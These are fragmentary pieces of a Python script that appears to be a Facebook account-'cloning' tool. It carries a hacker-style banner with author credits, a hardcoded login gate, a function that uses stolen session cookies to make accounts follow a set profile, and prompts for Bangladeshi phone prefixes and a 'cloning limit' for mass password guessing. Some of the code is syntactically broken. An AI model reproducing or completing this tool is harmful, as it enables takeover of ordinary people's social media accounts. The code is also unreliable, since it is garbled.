...
from rich.console import  as gp
...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('xdg-open fb://id/https://mbasic.facebook.com/UPDATE.DARK.CYBER.BD71', {
...
while attemps < 12345677901:
    ...
    if username == 'FUCK' and password == 'GF':
...
\033[1;32m[-] GITHUB    :\033[1;32m TASNIM74
\033[1;32m[-] FACEBOOK  :\033[1;32m SK JIBON HASAN
\033[1;35m══════════════════════════════════════════
\033[1;33m<═══\033[1;41m\033[1;97m THIS NAME IS HASAN BRAND\033[;0m\033[1;91m═══>\033[1;92m"""
...
def C1():
    ...
    name=input("\033[1;33mUSER NAME : \033[1;34m")
    os.system("clear")
    os.system('')
    print(logo)
    ...
    print('==============================================')
    print('[BD CODE] \033[\033[1;92m> \x1b[38;5;208m 017 - 019 - 018 - 015-016 - 013 - 014 ')
    print('==============================================')
    code = input('\033[\033[1;92mCHOOSE YOUR COUNTRY CODE : ')
    os.system('clear')
    print(logo)
    #os.system('espeak -a 300 " TYP YOUR CRACKED LIMITE"')
    limit = int(input('\033[\033[1;92m[●]EXAMPLE: 1000, 3000, 5000, 15000, 20000\n\033[1;92mCHOOSE CLONING LIMIT : '))
